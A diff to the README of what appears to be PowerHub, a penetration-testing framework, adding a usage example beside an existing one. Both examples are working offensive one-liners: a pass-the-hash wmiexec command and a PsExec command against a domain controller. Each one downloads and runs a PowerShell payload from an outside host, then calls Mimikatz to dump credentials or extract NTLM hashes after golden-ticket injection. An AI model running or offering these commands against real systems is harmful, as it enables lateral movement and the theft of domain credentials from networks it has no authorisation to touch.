@@ -67,8 +67,8 @@ changed.
 
 Read `./powerhub.py --help` for details.
 
-Example
-=======
+Examples
+========
 
 One nice application is, for example, the case where you have obtained some
 local administrator password hash and want to move laterally. This dumps the
@@ -80,6 +80,16 @@ wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
     ./administrator@10.0.1.4  \
     'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/0\"); Load-Hubmodule Mimikatz ; Invoke-Mimikatz -DumpCreds "'
 ```
+
+Or similarly, if you obtained the `krbtgt` hash and created a golden ticket
+which you injected with Mimikatz. Then you can get the NTLM hash of any
+arbitrary user in the forest:
+
+```
+PS C:\Users\pentestuser> .\PsExec64.exe \\DC01.acme.local -s powershell -c '$K=new-object net.webclient;IEX $K.downloadstring(\"http://192.168.1.5:8000/0\");load-hubmodule mimikatz; Invoke-Mimikatz -Command ''\"lsadump::lsa /inject /name:adm_targetuser\"'''
+```
+
+Getting the escape sequence on the quotes right can be tough...
 
 Author
 ======
